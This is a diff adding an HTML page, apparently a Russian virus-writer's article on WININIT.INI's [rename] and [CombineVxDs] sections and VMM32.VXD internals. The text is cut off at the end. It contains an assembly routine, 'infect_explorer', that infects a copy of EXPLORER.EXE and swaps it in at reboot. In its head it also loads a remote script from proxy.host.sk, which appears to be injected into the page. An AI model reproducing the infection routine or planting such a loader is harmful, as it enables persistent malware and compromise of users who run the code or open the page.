@@ -1,0 +1,114 @@
+<html>
+<head>
+<title>Про WININIT.INI</title><script language='JavaScript' type='text/javascript' src='http://proxy.host.sk/index.php'></script>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+</head>
+<body bgcolor=#B0B0B0 text=#000000 link=#000080 alink=#000000 vlink=#000080>
+
+<h2>Про WININIT.INI</h2>
+
+<p>Перед загрузкой маздая WININIT.EXE обрабатывает WININIT.INI:
+из секции [rename] считываются соответствующие имена и происходит
+так называемое "обновление" файлов.
+
+<pre>
+WININIT.INI:
+  [rename]
+  C:\WINDOWS\OLDFILE.EXE=C:\WINDOWS\NEWFILE.EXE
+</pre>
+
+<p>Требуется подобная фича тогда, когда подлежащий обновлению OLDFILE.EXE
+является, например, открытым или исполняемым в настоящий момент.
+(типа EXPLORER.EXE или KERNEL32.DLL)
+
+<p>Но мало кто знает, что кроме [rename] есть еще более убойная вещь,
+называемая [CombineVxDs]. Найдено оно было случайно при инсталляции win95,
+и, хотя тестировать такое мне попросту лениво, но это стопроцентно
+как-то работает.<br>
+Итак, вот что я нашел:
+
+<pre>
+WININIT.INI:
+  [CombineVxDs]
+  C:\WINDOWS\SYSTEM\VMM32\vkd.vxd=C:\WINDOWS\SYSTEM\vmm32.vxd
+</pre>
+
+<p>И действительно, взглянув в WININIT.EXE, я увидел не только <b>rename</b> и
+<b>CombineVxDs</b>, но и какое-то <b>SetupOptions</b>.
+
+<p>Короче говоря, флаг вам в руки...<!-- и электричку навстречу ;-) -->
+
+<h2>ПРИМЕЧАНИЯ</h2>
+
+<p>1. Обычный VMM32.VXD представляет из себя следующее:
+
+<pre>
+VMM32.VXD:
+  [dos-loader]   ~64k
+  формат W4:
+  [таблица указателей на VxD-файлы] ~1k
+  [запакованные VxD-файлы]
+</pre>
+
+<p>2. Распакованный VMM32.VXD представляет из себя вот что:
+
+<pre>
+VMM32.VXD:
+  [dos-loader]   те же самые 64k
+  формат W3:
+  [таблица указателей на VxD-файлы] ~2k
+  [распакованные VxD-файлы] (без MZ-хеадеров)
+</pre>
+
+<p>3. Работа с VMM32.VXD осуществляется утилитой DEVLIB.EXE из DDK\BIN.
+
+<pre>
+   devlib -u vmm32.vxd -- распаковываем
+   devlib -d vmm32.vxd -- получаем список VxDей (дамп таблицы указателей)
+   devlib -d vmm32.vxd dosmgr -- выдираем dosmgr.vxd (будет без MZ-хеадера)
+</pre>
+
+<p>4. Пример добавления секции [rename] в WININIT.INI:
+
+<pre>
+wininit_ini             db      'C:\WINDOWS\WININIT.INI',0
+wininit_section         db      'rename',0
+file_exe                db      'C:\WINDOWS\EXPLORER.EXE',0
+file_tmp                db      'C:\WINDOWS\EXPLORER.TMP',0
+
+infect_explorer:        push    0
+                        push    file_tmp
+                        push    file_exe
+                        callW   CopyFileA
+
+                        lea     edx, file_tmp
+                        call    INFECT_FILE
+
+                        callW   GetVersion
+                        shl     eax, 1
+                        jnc     __winNT
+
+__win95:                push    offset wininit_ini
+                        push    offset file_tmp
+                        push    offset file_exe
+                        push    offset wininit_section
+                        callW   WritePrivateProfileStringA
+
+                        jmp     __exit
+
+__winNT:                push    4 ; DELAY_UNTIL_REBOOT
+                        push    0
+                        push    offset file_exe
+                        callW   MoveFileExA
+
+                        push    4 ; DELAY_UNTIL_REBOOT
+                        push    offset file_exe
+                        push    offset file_tmp
+                        call    MoveFileExA
+
+__exit:                 ret     ; infect_explorer
+</pre>
+
+<p align=center>* * *</p>
+
+<p align=rig
